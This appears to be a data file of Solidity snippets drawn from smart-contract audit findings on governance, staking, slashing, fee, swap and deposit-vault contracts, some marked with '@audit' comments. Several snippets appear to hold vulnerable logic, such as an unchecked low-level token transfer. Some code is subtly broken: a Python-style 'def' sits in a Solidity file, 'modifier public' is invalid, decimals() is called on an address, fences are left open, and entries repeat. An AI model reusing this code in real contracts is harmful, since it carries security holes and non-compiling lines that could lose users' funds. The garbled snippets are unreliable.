```\nfunction recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    totalPower -= nftInfo.lastUpdate!= 0? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    nftInfo.currentPower = newPower;\n}\n\nfunction getNftPower(uint256 tokenId) public view override returns (uint256) {\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n    }\n```
"```\nfunction createTier(\n    mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,\n    uint256 newTierId,\n    ITokenSaleProposal.TierInitParams memory _tierInitParams\n) external {\n    tierInitParams.saleTokenAddress.call(\n        abi.encodeWithSelector(\n            IERC20.transferFrom.selector,\n            msg.sender,\n            address(this),\n            totalTokenProvided\n        )\n    );\n}\n```"
"```\nfunction getNftPower(uint256 tokenId) public view override returns (uint256) {\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n    }\n\n    uint256 collateral = nftInfos[tokenId].currentCollateral;\n\n    uint256 maxNftPower = getMaxPowerForNft(tokenId);\n    uint256 minNftPower = maxNftPower.ratio(collateral, getRequiredCollateralForNft(tokenId));\n    minNftPower = maxNftPower.min(minNftPower);\n\n    uint64 lastUpdate = nftInfos[tokenId].lastUpdate;\n    uint256 currentPower = nftInfos[tokenId].currentPower;\n\n    if (lastUpdate == 0) {\n        lastUpdate = powerCalcStartTimestamp;\n        currentPower = maxNftPower;\n    }\n\n    uint256 powerReductionPercent = reductionPercent * (block.timestamp - lastUpdate);\n    uint256 powerReduction = currentPower.min(maxNftPower.percentage(powerReductionPercent));\n    uint256 newPotentialPower = currentPower - powerReduction;\n\n    if (minNftPower <= newPotentialPower) {\n        return newPotentialPower;\n    }\n\n    if (minNftPower <= currentPower) {\n        return minNftPower;\n    }\n\n    return currentPower;\n}\n\nfunction recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    totalPower -= nftInfo.lastUpdate!= 0? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    nftInfo.currentPower = newPower;\n}\n```"
"```\nfunction delegateTreasury(\n    address delegatee,\n    uint256 amount,\n    uint256[] calldata nftIds\n) external override onlyThis {\n    require(amount > 0 || nftIds.length > 0, ""Gov: empty delegation"");\n    require(getExpertStatus(delegatee), ""Gov: delegatee is not an expert"");\n\n    _unlock(delegatee);\n\n    if (amount!= 0) {\n        address token = _govUserKeeper.tokenAddress();\n\n        IERC20(token).transfer(address(_govUserKeeper), amount / 10**token.decimals());\n\n        _govUserKeeper.delegateTokensTreasury(delegatee, amount);\n    }\n\n    if (nftIds.length!= 0) {\n        IERC721 nft = IERC721(_govUserKeeper.nftAddress());\n\n        for (uint256 i = 0; i < nftIds.length; i++) {\n            nft.safeTransferFrom(address(this), address(_govUserKeeper), nftIds[i]);\n        }\n\n        _govUserKeeper.delegateNftsTreasury(delegatee, nftIds);\n    }\n\n    _revoteDelegated(delegatee, VoteType.TreasuryVote);\n\n    emit DelegatedTreasury(delegatee, amount, nftIds, true);\n}\n```"
"```\nfunction _getInitialVotingRewards(\n    IGovPool.ProposalCore storage core,\n    IGovPool.VoteInfo storage voteInfo\n) internal view returns (uint256) {\n    (uint256 coreVotes, uint256 coreRawVotes) = \n        voteInfo.isVoteFor \n       ? (core.votesFor, core.rawVotesFor) \n        : (core.votesAgainst, core.rawVotesAgainst);\n\n    return \n        coreRawVotes.ratio(\n            core.settings.rewardsInfo.voteRewardsCoefficient, \n            PRECISION\n        ).ratio(\n            voteInfo.totalVoted, \n            coreVotes\n        );\n}"
"```\nfunction execute(\n    mapping(uint256 => IGovPool.Proposal) storage proposals,\n    uint256 proposalId\n) external {\n    for (uint256 i; i < actionsLength; i++) {\n        (bool status, bytes memory returnedData) = actions[i].executor.call{\n            value: actions[i].value\n        }(actions[i].data);\n        require(status, returnedData.getRevertMsg());\n    }\n}"
"```\n(bool status,) = payable(receiver).call{value: amount}("""");\nrequire(status, ""Gov: failed to send eth"");\n```\n```\n(bool status, bytes memory data) = payable(receiver).call{value: amount}("""");\nrequire(status, ""Gov: failed to send eth"");\n```"
"```\nFile: factory/PoolFactory.sol\n\nreturn keccak256(abi.encodePacked(deployer, poolName));\n```\n```\nfunction getResultsHash() public view returns (bytes32) {\n    return keccak256(abi.encodePacked(resultsHash, block.chainid, address(this)));\n}\n```\n```\nFile: user/UserRegistry.sol\n\ndef _signatureHashes(_documentHash, msg.sender):\n    _signatureHashes[_documentHash][msg.sender] = keccak256(abi.encodePacked(signature))\n```"
"```\nfunction _verifyRemoveSig(\n    address fidOwner,\n    bytes memory key,\n    uint256 deadline,\n    bytes memory sig\n) internal {\n    _verifySig(\n        _hashTypedDataV4(\n            keccak256(abi.encode(REMOVE_TYPEHASH, fidOwner, keccak256(key), _useNonce(fidOwner), deadline))\n        ),\n        fidOwner,\n        deadline,\n        sig\n    );\n}\n```"
```\nfunction minimumStakeWei() public view returns (uint) {\n    return (flaggerRewardWei + flagReviewerCount * flagReviewerRewardWei) * 1 ether / slashingFraction;\n}\n```
"```\nuint amountOperatorTokens = \n    moduleCall(\n        address(exchangeRatePolicy), \n        abi.encodeWithSelector(\n            exchangeRatePolicy.operatorTokenToDataInverse.selector, \n            amountDataWei\n        )\n    );\n```\n```\nfunction operatorTokenToDataInverse(uint dataWei) external view returns (uint operatorTokenWei) {\n    return dataWei * this.totalSupply() / valueWithoutEarnings();\n}\n```"
"```\nfunction onUndelegate(address delegator, uint amount) external {\n    if (delegator!= owner) {\n        return;\n    }\n\n    uint actualAmount = amount < balanceOf(owner)? amount : balanceOf(owner); // @audit amount:DATA, balanceOf:Operator\n    uint balanceAfter = balanceOf(owner) - actualAmount;\n    uint totalSupplyAfter = totalSupply() - actualAmount;\n    require(1 ether * balanceAfter >= totalSupplyAfter * streamrConfig.minimumSelfDelegationFraction(), ""error_selfDelegationTooLow"");\n}\n```"
```\nfunction _endVote(address target) internal {\n    address flagger = flaggerAddress[target];\n    bool flaggerIsGone = stakedWei[flagger] == 0;\n    bool targetIsGone = stakedWei[target] == 0;\n    uint reviewerCount = reviewers[target].length;\n\n    // release stake locks before vote resolution so that slashings and kickings during resolution aren't affected\n    if (flaggerIsGone) {\n        forfeitedStakeWei -= flagStakeWei[target];\n    } else {\n        lockedStakeWei[flagger] -= flagStakeWei[target];\n    }\n    if (targetIsGone) {\n        forfeitedStakeWei -= targetStakeAtRiskWei[target];\n    } else {\n        lockedStakeWei[target] -= targetStakeAtRiskWei[target];\n    }\n```
"```\ntargetStakeAtRiskWei[target] = max(\n    stakedWei[target],\n    streamrConfig.minimumStakeWei()\n) * streamrConfig.slashingFraction() / 1 ether"
"```\nfunction onFlag(address target, address flagger) external {\n    require(flagger!= target, ""error_cannotFlagSelf"");\n    require(voteStartTimestamp[target] == 0 && block.timestamp > protectionEndTimestamp[target], ""error_cannotFlagAgain""); \n    require(stakedWei[flagger] >= minimumStakeOf(flagger), ""error_notEnoughStake"");\n    require(stakedWei[target] > 0, ""error_flagTargetNotStaked"");\n```"
"```\nFile: contracts/OperatorTokenomics/Operator.sol\n\nif (balanceOf(to) == 0) {\n    if (address(delegationPolicy)!= address(0)) {\n        moduleCall(address(delegationPolicy), abi.encodeWithSelector(delegationPolicy.onDelegate.selector, to));\n    }\n}\nsuper._transfer(from, to, amount);\n```"
```\nif (msg.sender!= address(token)) {\n    revert AccessDeniedDATATokenOnly();\n}
"```\nfunction addUnderlying(uint256 amount, uint256 minAmountOut) internal {\n    C.bean().mint(\n        address(this),\n        newDepositedBeans.add(newDepositedLPBeans)\n    );\n\n    uint256 newLP = C.curveZap().add_liquidity(\n        C.CURVE_BEAN_METAPOOL,\n        [\n            newDepositedLPBeans, \n            0,\n            amount, \n            0\n        ],\n        minAmountOut\n    );\n\n    LibUnripe.incrementUnderlying(C.UNRIPE_BEAN, newDepositedBeans);\n    LibUnripe.incrementUnderlying(C.UNRIPE_LP, newLP);\n\n    s.recapitalized = s.recapitalized.add(amount);\n}\n```\n```\nfunction addUnderlying(uint256 usdAmount, uint256 minAmountOut) internal {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n\n    uint256 percentToFill = usdAmount.mul(C.precision()).div(remainingRecapitalization());\n    uint256 newDepositedBeans;\n    if (C.unripeBean().totalSupply() > s.u[C.UNRIPE_BEAN].balanceOfUnderlying) {\n        newDepositedBeans = (C.unripeBean().totalSupply()).sub(s.u[C.UNRIPE_BEAN].balanceOfUnderlying);\n        newDepositedBeans = newDepositedBeans.mul(percentToFill).div(C.precision());\n    }\n\n    uint256 newDepositedLPBeans = usdAmount.mul(C.exploitAddLPRatio()).div(DECIMALS);\n\n    C.bean().mint(address(this), newDepositedBeans);\n\n    C.bean().mint(address(C.BEAN_ETH_WELL), newDepositedLPBeans);\n\n    uint256 newLP = IWell(C.BEAN_ETH_WELL).sync(address(this), minAmountOut);\n\n    LibUnripe.incrementUnderlying(C.UNRIPE_BEAN, newDepositedBeans);\n    LibUnripe.incrementUnderlying(C.UNRIPE_LP, newLP);\n\n    s.recapitalized = s.recapitalized.add(usdAmount);\n}\n```\nfunction push(uint128 id) internal {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    if (s.fFirst == 0) {\n        s.season.fertilizing = true;\n        s.fLast = id;\n        s.fFirst = id;\n    } else if (id <= s.fFirst) {\n        setNext(id, s.fFirst);\n        s.fFirst = id;\n    } else if (id >= s.fLast) {\n        setNext(s.fLast, id);\n        s.fLast = id;\n    } else {\n        uint128 prev = s.fFirst;\n        uint128 next = getNext(prev);\n        while (id > next) {\n            prev = next;\n            next = getNext(next);\n        }\n        setNext(prev, id);\n        setNext(id, next);\n    }\n}\n```\nfunction pop() internal returns (bool) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    uint128 first = s.fFirst;\n    s.activeFertilizer = s.activeFertilizer.sub(getAmount(first));\n    uint128 next = getNext(first);\n    if (next!= 0) {\n        s.fFirst = getNext(first);\n        return true;\n    }\n    require(s.activeFertilizer == 0, ""Still active fertilizer"");\n    s.fFirst = 0;\n    s.fLast = 0;\n    s.season.fertilizing = false;\n    return false;\n}"
"```\nTransferUtils.sol\nfunction _transferERC20(address token, address to, uint256 amount) internal {\n    IERC20 erc20 = IERC20(token);\n    require(erc20!= IERC20(address(0)), ""Token Address is not an ERC20"");\n    uint256 initialBalance = erc20.balanceOf(to);\n    require(erc20.transfer(to, amount), ""ERC20 Transfer failed"");\n    uint256 balance = erc20.balanceOf(to);\n    require(balance >= (initialBalance + amount), ""ERC20 Balance check failed"");\n}\n```"
"```\nTransferUtils.sol\nfunction _transferERC20(address token, address to, uint256 amount) internal {\n    IERC20 erc20 = IERC20(token);\n    require(erc20!= IERC20(address(0)), ""Token Address is not an ERC20"");\n    uint256 initialBalance = erc20.balanceOf(to);\n    require(erc20.transfer(to, amount), ""ERC20 Transfer failed"");\n    uint256 balance = erc20.balanceOf(to);\n    require(balance >= (initialBalance + amount), ""ERC20 Balance check failed"");\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract FeeData {\n    uint256 private _feeValue;\n    uint256 private _fixedFee;\n\n    function setFeeValue(uint256 feeValue) external onlyOwner {\n        require(feeValue < _feeDenominator, ""Fee percentage must be less than 1"");\n        _feeValue = feeValue;\n    }\n\n    function setFixedFee(uint256 fixedFee) external onlyOwner {\n        _fixedFee = fixedFee;\n    }\n}\n```\npragma solidity ^0.8.0;\n\ncontract FeeData {\n    function setFeeValue(uint256 feeValue) external onlyOwner {\n        // code\n    }\n\n    function setMaxHops(uint256 maxHops) external onlyOwner {\n        // code\n    }\n\n    function setMaxSwaps(uint256 maxSwaps) external onlyOwner {\n        // code\n    }\n\n    function setFixedFee(uint256 fixedFee) external onlyOwner {\n        // code\n    }\n\n    function setFeeToken(address feeTokenAddress) public onlyOwner {\n        // code\n    }\n\n    function setFeeTokens(address[] memory feeTokenAddresses) public onlyOwner {\n        // code\n    }\n\n    function clearFeeTokens() public onlyOwner {\n        // code\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\ncontract helpers {\n    function setRewardHandler(address rewardAddress) external onlyOwner {\n        // Code here\n    }\n\n    function setRewardsActive(bool _rewardsActive) external onlyOwner {\n        // Code here\n    }\n}\n```"
"```\nfunction calculateMultiSwap(SwapUtils.MultiClaimInput calldata multiClaimInput) external view returns (SwapUtils.SwapCalculation memory) {\n    uint256 swapIdCount = multiClaimInput.swapIds.length;\n    if (swapIdCount == 0 || swapIdCount > _maxHops) {\n        revert Errors.InvalidMultiClaimSwapCount(_maxHops, swapIdCount);\n    }\n\n    if (swapIdCount == 1) {\n        SwapUtils.Swap memory swap = swaps[multiClaimInput.swapIds[0]];\n        return SwapUtils._calculateSwapNetB(swap, multiClaimInput.amountB, _feeValue, _feeDenominator, _fixedFee);\n    }\n\n    uint256 matchAmount = multiClaimInput.amountB;\n    address matchToken = multiClaimInput.tokenB;\n    uint256 swapId;\n    bool complete = true;\n\n    for (uint256 i = 0; i < swapIdCount; i++) {\n        swapId = multiClaimInput.swapIds[i];\n        SwapUtils.Swap memory swap = swaps[swapId];\n        if (swap.tokenB!= matchToken) {\n            revert Errors.NonMatchingToken();\n        }\n        if (swap.amountB < matchAmount) {\n            if (!swap.isPartial) {\n                revert Errors.NotPartialSwap();\n            }\n            matchAmount = MathUtils._mulDiv(swap.amountA, matchAmount, swap.amountB);\n            complete = complete && false;\n        } else {\n            matchAmount = swap.amountA;\n        }\n        matchToken = swap.tokenA;\n    }\n\n    (uint8 feeType,) = _calculateFeeType(multiClaimInput.tokenA, multiClaimInput.tokenB);\n    uint256 fee = FeeUtils._calculateFees(matchAmount, multiClaimInput.amountB, feeType, swapIdCount, _feeValue, _feeDenominator, _fixedFee);\n\n    SwapUtils.SwapCalculation memory calculation;\n    calculation.amountA = matchAmount;\n    calculation.amountB = multiClaimInput.amountB;\n    calculation.fee = fee;\n    calculation.feeType = feeType;\n    calculation.isTokenBNative = multiClaimInput.tokenB == Constants.NATIVE_ADDRESS;\n    calculation.isComplete = complete;\n    calculation.nativeSendAmount = SwapUtils._calculateNativeSendAmount(calculation.amountB, calculation.fee, calculation.feeType, calculation.isTokenBNative);\n\n    return calculation;\n}"
"```\nfunction advancedPipe(AdvancedPipeCall[] calldata pipes, uint256 value)\n    external\n    payable\n    returns (bytes[] memory results)\n{\n    results = IPipeline(PIPELINE).advancedPipe{value: value}(pipes);\n    LibEth.refundEth();\n}\n```\n```\nfunction refundEth() internal {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    if (address(this).balance > 0 && s.isFarm!= 2) {\n        (bool success,) = msg.sender.call{value: address(this).balance}(new bytes(0));\n        require(success, ""Eth transfer Failed."");\n    }\n}\n```\n```\nfunction advancedPipe(AdvancedPipeCall[] calldata pipes)\n    external\n    payable\n    override\n    returns (bytes[] memory results) {\n    results = new bytes[](pipes.length);\n    for (uint256 i = 0; i < pipes.length; i++) {\n        results[i] = _advancedPipe(pipes[i], results);\n    }\n}\n```"
"```\nmodifier public withEth() {\n    if (msg.value > 0) {\n        s.isFarm = 2;\n    }\n    _;\n    if (msg.value > 0) {\n        s.isFarm = 1;\n        LibEth.refundEth();\n    }\n}\n```\n```\nfunction refundEth() internal {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    if (address(this).balance > 0 && s.isFarm!= 2) {\n        (bool success,) = msg.sender.call{value: address(this).balance}(new bytes(0));\n        require(success, ""Eth transfer Failed."");\n    }\n}\n```"
"```\nif (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {\n    uint256 beforeBalance = token.balanceOf(recipient);\n    token.safeTransferFrom(sender, recipient, amount);\n    return token.balanceOf(recipient).sub(beforeBalance);\n} else {\n    amount = receiveToken(token, amount, sender, fromMode);\n    sendToken(token, amount, recipient, toMode);\n    return amount;\n}\n```"
"```\nfunction getDeltaB() internal view returns (int256 deltaB) {\n    uint256[2] memory balances = C.curveMetapool().get_balances();\n    uint256 d = getDFroms(balances);\n    deltaB = getDeltaBWithD(balances[0], d);\n}\n```"
"```\nrequire(\n    currentAllowance >= subtractedValue,\n    ""Silo: decreased allowance below zero""\n);"
"```\nfunction deposit(uint256 amount, address tokenAddress) public payable {\n    require(amount > 0 || msg.value > 0, ""Deposit amount must be greater than 0"");\n\n    if (msg.value > 0) {\n        require(tokenAddress == address(0), ""Token address must be 0x0 for ETH deposits"");\n        uint256 depositIndex = deposits.length;\n        deposits.push(Deposit(payable(msg.sender), msg.value, tokenAddress));\n        emit DepositMade(msg.sender, depositIndex, msg.value, tokenAddress);\n    } else {\n        require(tokenAddress!= address(0), ""Token address must not be 0x0 for token deposits"");\n        IERC20 token = IERC20(tokenAddress);\n        token.safeTransferFrom(msg.sender, address(this), amount);\n        uint256 depositIndex = deposits.length;\n        deposits.push(Deposit(payable(msg.sender), amount, tokenAddress));\n        emit DepositMade(msg.sender, depositIndex, amount, tokenAddress);\n    }\n}"
"```\nfunction deposit(uint256 amount, address tokenAddress) public payable {\n    require(amount > 0 || msg.value > 0, ""Deposit amount must be greater than 0"");\n\n    if (msg.value > 0) {\n        require(tokenAddress == address(0), ""Token address must be 0x0 for ETH deposits"");\n        uint256 depositIndex = deposits.length;\n        deposits.push(Deposit(payable(msg.sender), msg.value, tokenAddress));\n        emit DepositMade(msg.sender, depositIndex, msg.value, tokenAddress);\n    } else {\n        require(tokenAddress!= address(0), ""Token address must not be 0x0 for token deposits"");\n        IERC20 token = IERC20(tokenAddress);\n        token.safeTransferFrom(msg.sender, address(this), amount);\n        uint256 depositIndex = deposits.length;\n        deposits.push(Deposit(payable(msg.sender), amount, tokenAddress));\n        emit DepositMade(msg.sender, depositIndex, amount, tokenAddress);\n    }\n}"
"```\nfunction withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public {\n    require(nonce < deposits.length, ""Invalid deposit index"");\n    Deposit storage depositToWithdraw = deposits[nonce];\n    bytes32 withdrawalHash = getWithdrawalHash(Withdrawal(amount, nonce));\n    address signer = withdrawalHash.recover(signature);\n    require(signer == depositToWithdraw.depositor, ""Invalid signature"");\n    require(!usedWithdrawalHashes[withdrawalHash], ""Withdrawal has already been executed"");\n    require(amount == depositToWithdraw.amount, ""Withdrawal amount must match deposit amount"");\n    usedWithdrawalHashes[withdrawalHash] = true;\n    depositToWithdraw.amount = 0;\n    if (depositToWithdraw.tokenAddress == address(0)) {\n        recipient.transfer(amount);\n    } else {\n        IERC20 token = IERC20(depositToWithdraw.tokenAddress);\n        token.safeTransfer(recipient, amount);\n    }\n    emit WithdrawalMade(recipient, amount);\n}\n```"
"```\nfunction withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public {\n    require(nonce < deposits.length, ""Invalid deposit index"");\n    Deposit storage depositToWithdraw = deposits[nonce];\n    bytes32 withdrawalHash = getWithdrawalHash(Withdrawal(amount, nonce));\n    address signer = withdrawalHash.recover(signature);\n    require(signer == depositToWithdraw.depositor, ""Invalid signature"");\n    require(!usedWithdrawalHashes[withdrawalHash], ""Withdrawal has already been executed"");\n    require(amount == depositToWithdraw.amount, ""Withdrawal amount must match deposit amount"");\n    usedWithdrawalHashes[withdrawalHash] = true;\n    depositToWithdraw.amount = 0;\n    if (depositToWithdraw.tokenAddress == address(0)) {\n        recipient.transfer(amount);\n    } else {\n        IERC20 token = IERC20(depositToWithdraw.tokenAddress);\n        token.safeTransfer(recipient, amount);\n    }\n    emit WithdrawalMade(recipient, amount);\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract DepositVault {\n    function deposit(uint256 amount, address tokenAddress) public payable {\n        // code\n    }\n\n    function withdraw(uint256 amount, uint256 nonce, bytes memory signature, address payable recipient) public {\n        // code\n    }\n\n    function withdrawDeposit(uint256 depositIndex) public {\n        // code\n    }\n}\n```"
"```\nfunction withdraw(uint256 _amount) external {\n    if (_amount == 0) {\n        revert InvalidAmount();\n    }\n    IERC20Upgradeable(address(stakingPool)).safeTransferFrom(msg.sender, address(this), _amount);\n    _withdraw(msg.sender, _amount);\n}\n```\n```\nfunction _withdraw(address _account, uint256 _amount) internal {\n    if (poolStatus == PoolStatus.CLOSED) {\n        revert WithdrawalsDisabled();\n    }\n\n    uint256 toWithdrawFromQueue = _amount <= totalQueued? _amount : totalQueued;\n    uint256 toWithdrawFromPool = _amount - toWithdrawFromQueue;\n\n    if (toWithdrawFromQueue!= 0) {\n        totalQueued -= toWithdrawFromQueue;\n        depositsSinceLastUpdate += toWithdrawFromQueue;\n    }\n\n    if (toWithdrawFromPool!= 0) {\n        stakingPool.withdraw(address(this), address(this), toWithdrawFromPool);\n    }\n\n    // @audit-warning at this point, toWithdrawFromQueue of LSD tokens remain in this contract!\n\n    token.safeTransfer(_account, _amount);\n    emit Withdraw(_account, toWithdrawFromPool, toWithdrawFromQueue);\n}"
"```\n/**\n * @title GeoEmaAndCumSmaPump\n * @author Publius\n * @notice Stores a geometric EMA and cumulative geometric SMA for each reserve.\n * @dev A Pump designed for use in Beanstalk with 2 tokens.\n *\nThis Pump has 3 main features:\n  1. Multi-block MEV resistance reserves\n  2. MEV-resistant Geometric EMA intended for instantaneous reserve queries\n  3. MEV-resistant Cumulative Geometric intended for SMA reserve queries\n\nNote: If an `update` call is made with a reserve of 0, the Geometric mean oracles will be set to 0.\nEach Well is responsible for ensuring that an `update` call cannot be made with a reserve of 0.\n*/\n```\nGeoEmaAndCumSmaPump.sol\nfor (uint i; i < length; ++i) {\n    b.lastReserves[i] = _capReserve(b.lastReserves[i], (reserves[i] > 0? reserves[i] : 1).fromUIntToLog2(), blocksPassed);\n    b.emaReserves[i] = b.lastReserves[i].mul(ABDKMathQuad.ONE.sub(aN)).add(b.emaReserves[i].mul(aN));\n    b.cumulativeReserves[i] = b.cumulativeReserves[i].add(b.lastReserves[i].mul(deltaTimestampBytes));\n}\n```"
"```\nsrc/libraries/LibLastReserveBytes.sol\nuint8 n = uint8(reserves.length);\nif (n == 1) {\n    assembly {\n        sstore(slot, or(or(shl(208, lastTimestamp), shl(248, n)), shl(104, shr(152, mload(add(reserves, 32)))))\n    }\n    return;\n}\nassembly {\n    sstore(slot, or(or(shl(208, lastTimestamp), shl(248, n)), or(shl(104, shr(152, mload(add(reserves, 32)))), shr(152, mload(add(reserves, 64)))))\n}\n```\n```\nrequire(reserves[0] <= type(uint128).max, ""ByteStorage: too large"")\n```"
